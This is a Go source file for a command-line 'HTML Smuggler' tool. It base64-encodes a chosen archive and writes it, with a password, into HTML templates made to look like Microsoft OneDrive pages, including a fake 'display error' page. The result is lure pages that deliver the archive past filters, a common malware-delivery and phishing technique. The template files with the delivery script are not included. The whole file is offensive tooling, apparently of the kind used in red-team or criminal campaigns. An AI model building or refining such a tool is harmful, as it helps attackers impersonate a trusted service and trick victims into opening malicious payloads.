package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/fatih/color"
)

// colors
var blue = color.New(color.FgBlue).SprintFunc()
var green = color.New(color.FgGreen).SprintFunc()
var red = color.New(color.FgRed).SprintFunc()

func zevenco(html, old, new string) string { // replace content in html file
	return strings.ReplaceAll(html, old, new)
}

func pastrroje() { // Clean the console
	fmt.Print("\033[H\033[2J")
}

func onederiveSuc() { // 1 onedrive default
	pastrroje()
	fmt.Println("OneDrive Default Template")
	fmt.Println("")
	defualtHTML, err := os.ReadFile("templ\\onedrive_suc.html")
	if err != nil {
		fmt.Println(red("[!]"), " Something went wrong when trying to read the file\nPlease ensure that it's located in the templ folder")
	}

	passVal := "####docPass####" // archive password
	b64 := "####b64####"         // base64 encoded archive

	// user input
	var usrPassVal string
	var usrArcNameVal string

	fmt.Println(blue("[!]"), "Archive File:")
	fmt.Scan(&usrArcNameVal)
	fmt.Println("")

	arikva, err := os.ReadFile(usrArcNameVal) // read archive
	if err != nil {
		fmt.Println(red("[!]"), " File not found")
	}

	b64Arkiv := base64.StdEncoding.EncodeToString(arikva) // encode archive to b64
	modChiterri := zevenco(string(defualtHTML), b64, b64Arkiv)
	os.WriteFile("onedrive_default.html", []byte(modChiterri), 0644)
	fmt.Println("")

	newHTML, err := os.ReadFile("onedrive_default.html")
	if err != nil {
		fmt.Println(red("[!]"), " Something went wrong when trying to read the file")
	}

	fmt.Println(blue("[!]"), "Archive Password:")
	fmt.Scan(&usrPassVal)
	modDva := zevenco(string(newHTML), passVal, usrPassVal)
	os.WriteFile("onedrive_default.html", []byte(modDva), 0644)

	fmt.Println(blue("[!]"), " File Built =)")
	time.Sleep(3 * time.Second)
}

func onedriveDisp() { // 2 onedrive deisplay err
	pastrroje()
	fmt.Println("OneDrive Display Error Template")
	fmt.Println("")
	defualtHTML, err := os.ReadFile("templ\\onedrive_disp.html")
	if err != nil {
		fmt.Println(red("[!]"), " Something went wrong when trying to read the file\nPlease ensure that it's located in the templ folder")
	}

	passVal := "####docPass####" // archive password
	b64 := "####b64####"         // base64 encoded archive

	// user input
	var usrPassVal string
	var usrArcNameVal string

	fmt.Println(blue("[!]"), "Archive File:")
	fmt.Scan(&usrArcNameVal)
	fmt.Println("")

	arikva, err := os.ReadFile(usrArcNameVal) // read archive
	if err != nil {
		fmt.Println(red("[!]"), " File not found")
	}

	b64Arkiv := base64.StdEncoding.EncodeToString(arikva) // encode archive to b64
	modChiterri := zevenco(string(defualtHTML), b64, b64Arkiv)
	os.WriteFile("onedrive_displayerr.html", []byte(modChiterri), 0644)
	fmt.Println("")

	newHTML, err := os.ReadFile("onedrive_displayerr.html")
	if err != nil {
		fmt.Println(red("[!]"), " Something went wrong when trying to read the file")
	}

	fmt.Println(blue("[!]"), "Archive Password:")
	fmt.Scan(&usrPassVal)
	modDva := zevenco(string(newHTML), passVal, usrPassVal)
	os.WriteFile("onedrive_displayerr.html", []byte(modDva), 0644)

	fmt.Println(blue("[!]"), " File Built =)")
	time.Sleep(3 * time.Second)
}

func main() {
	var kerkes int // usr input
	fmt.Println("- HTML Smuggler -")
	fmt.Println("")
	fmt.Println("")
	fmt.Println(green("[1]"), " OneDrive Default")
	fmt.Println(green("[2]"), " OneDrive Display Error")
	fmt.Println(green("[!]"), " More Soon Maybe? =)")
	fmt.Println("")
	fmt.Println(blue("[!]"), " Select Template:")
	fmt.Scan(&kerkes) // read

	// take action based on user input

	switch kerkes {
	case 1:
		onederiveSuc()
	case 2:
		onedriveDisp()
	default:
		println(red("[!]"), " Error! Please select a valid option!")
		time.Sleep(4 * time.Second)
	}

}
